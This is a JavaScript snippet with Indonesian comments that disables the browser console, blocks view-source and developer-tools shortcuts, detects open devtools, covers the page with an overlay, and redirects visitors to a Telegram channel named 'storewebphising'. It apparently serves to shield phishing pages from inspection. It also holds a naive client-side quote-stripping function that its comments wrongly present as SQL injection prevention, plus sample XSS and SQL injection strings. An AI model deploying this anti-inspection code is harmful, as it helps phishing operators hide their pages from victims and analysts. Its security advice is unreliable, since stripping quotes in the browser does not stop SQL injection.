(function() {
    // Menampilkan ASCII art saat konsol dibuka
    var asciiArt = `
███╗░░░███╗░█████╗░███╗░░██╗██╗░░░██╗██╗░░░██╗
████╗░████║██╔══██╗████╗░██║╚██╗░██╔╝██║░░░██║
██╔████╔██║███████║██╔██╗██║░╚████╔╝░██║░░░██║
██║╚██╔╝██║██╔══██║██║╚████║░░╚██╔╝░░██║░░░██║
██║░╚═╝░██║██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
    `;

    // Menonaktifkan akses ke console
    Object.defineProperty(window, 'console', {
        get: function() {
            return {
                log: function() {},
                warn: function() {},
                error: function() {},
                info: function() {}
            };
        }
    });

    // Menambahkan overlay untuk menonaktifkan interaksi
    function disableInteraction() {
        var overlay = document.createElement("div");
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100%";
        overlay.style.height = "100%";
        overlay.style.backgroundColor = "rgba(255, 255, 255, 0.9)";
        overlay.style.zIndex = "9999";
        overlay.style.pointerEvents = "auto";  // Menonaktifkan interaksi dengan elemen
        document.body.appendChild(overlay);
    }

    // Validasi dan sanitasi input untuk mencegah XSS
    function sanitizeInput(input) {
        // Menambahkan pengamanan dengan menggantikan karakter berbahaya
        var element = document.createElement('div');
        element.innerText = input;  // Menggunakan innerText untuk menghindari eksekusi JavaScript
        return element.innerHTML;  // Mengembalikan input yang sudah disanitasi
    }

    // Fungsi untuk mencegah SQL Injection dengan menggunakan parameterized queries
    function preventSQLInjection(input) {
        // Pada client-side, ini hanya berupa sanitasi dan validasi input untuk menghindari karakter berbahaya
        var sanitizedInput = input.replace(/['";]/g, '');  // Menghapus karakter berbahaya seperti ' dan ;
        return sanitizedInput;
    }

    // Mendeteksi jika user menekan Ctrl + U atau membuka developer tools
    window.addEventListener('keydown', function(event) {
        // Deteksi jika pengguna menekan 'Ctrl + U'
        if (event.ctrlKey && (event.key === 'u' || event.key === 'U')) {
            event.preventDefault();  // Mencegah membuka view-source
            window.location.href = 'https://t.me/storewebphising';  // Arahkan ke URL
        }

        // Deteksi jika pengguna menekan 'Ctrl + Shift + I' (Developer Tools)
        if (event.ctrlKey && event.shiftKey && event.key === 'I') {
            event.preventDefault();  // Mencegah membuka developer tools
            window.location.href = 'https://t.me/storewebphising';  // Arahkan ke URL
        }
    });

    // Deteksi ketika Developer Tools dibuka
    var devtools = /./;
    devtools.toString = function() {
        // Menampilkan ASCII art di konsol
        console.log(asciiArt);
        // Menambahkan overlay untuk menonaktifkan interaksi dengan halaman
        disableInteraction();
        // Mengarahkan ke halaman
        window.location.href = 'https://t.me/storewebphising';
    };

    console.log(devtools);  // Memicu pengalihan jika Developer Tools dibuka

    // Contoh penggunaan sanitasi input dan pencegahan SQL Injection
    var userInput = '<script>alert("XSS Attack!");</script>';
    var sanitizedInput = sanitizeInput(userInput); // Sanitasi input untuk XSS
    console.log("Sanitized Input (XSS):", sanitizedInput);

    var sqlInput = "SELECT * FROM users WHERE username = 'admin' --";
    var safeInput = preventSQLInjection(sqlInput); // Sanitasi input untuk SQL Injection
    console.log("Sanitized Input (SQL Injection):", safeInput);

})();
